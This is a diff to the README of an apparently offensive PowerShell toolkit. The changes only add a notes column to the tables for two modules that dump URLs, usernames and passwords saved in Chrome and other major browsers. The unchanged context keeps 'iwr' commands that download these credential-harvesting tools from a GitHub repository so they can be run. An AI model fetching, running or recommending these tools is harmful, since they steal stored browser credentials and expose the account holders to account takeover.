@@ -1,9 +1,9 @@
 ## Module Name
    <b><i>DumpChromePasswords.ps1</i></b>
 
-|Cmdlet Name|Description|Privileges
-|---|---|---|
-|DumpChromePasswords|dumps URLs, usernames, and passwords from Chrome.|User Land|
+|Cmdlet Name|Description|Privileges|Notes|
+|---|---|---|---|
+|DumpChromePasswords|dumps URLs, usernames, and passwords from Chrome.|User Land|Only dumps chrome browser|
 
    **prerequisites:**
 ``` 
@@ -27,9 +27,9 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-B
 ## Module Name
    <b><i>HarvestBrowserPasswords.exe</i></b>
 
-|Binary Name|Description|Privileges
-|---|---|---|
-|HarvestBrowserPasswords|dumps URLs, usernames, and passwords from major browsers.|User Land|
+|Binary Name|Description|Privileges|Notes|
+|---|---|---|---|
+|HarvestBrowserPasswords|dumps URLs, usernames, and passwords from major browsers.|User Land|Dumps majot browsers|
 
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/HarvestBrowserPasswords.exe" -OutFile "HarvestBrowserPasswords.exe"
